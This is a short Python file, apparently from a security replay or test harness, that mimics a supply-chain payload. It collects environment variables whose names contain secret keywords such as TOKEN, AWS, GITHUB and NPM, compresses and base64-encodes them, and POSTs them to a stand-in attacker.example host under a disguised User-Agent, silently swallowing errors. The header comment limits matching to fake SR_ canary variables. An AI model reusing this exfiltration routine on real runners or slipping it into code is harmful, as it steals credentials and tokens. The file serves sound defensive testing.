# Detached-child payload for the SC6 replay (see __init__.py). Mirrors the advisory's keyword list
# for matching candidate secret names (TOKEN, SECRET, PASSWORD, KEY, AZURE, AWS, GITHUB, HF_,
# OPENAI, NPM, PIP, CI_) and its gzip + base64 + POST exfil path, but the match is additionally
# scoped to the SR_ canary prefix: every variable this replay seeds is named SR_CANARY_<KEYWORD>
# with a FAKE value, so the keyword list is reproduced exactly without ever being able to match a
# real credential on a real runner. The POST target is not on any allowlist, and every error -
# including the DNS failure default-deny egress produces - is silenced, matching the real payload.
import base64
import gzip
import os
import urllib.request

_KEYWORDS = ("TOKEN", "SECRET", "PASSWORD", "KEY", "AZURE", "AWS", "GITHUB", "HF_", "OPENAI", "NPM", "PIP", "CI_")
_SINK = "https://webhook-replay.pth-replay.attacker.example/collect"


def run():
    try:
        harvested = {
            k: v for k, v in os.environ.items()
            if k.startswith("SR_") and any(kw in k for kw in _KEYWORDS)
        }
        if not harvested:
            return
        blob = "\n".join(f"{k}={v}" for k, v in sorted(harvested.items())).encode()
        payload = base64.b64encode(gzip.compress(blob))
        req = urllib.request.Request(
            _SINK,
            data=payload,
            method="POST",
            headers={"User-Agent": "af-runtime-diagnostics/1"},
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass


run()
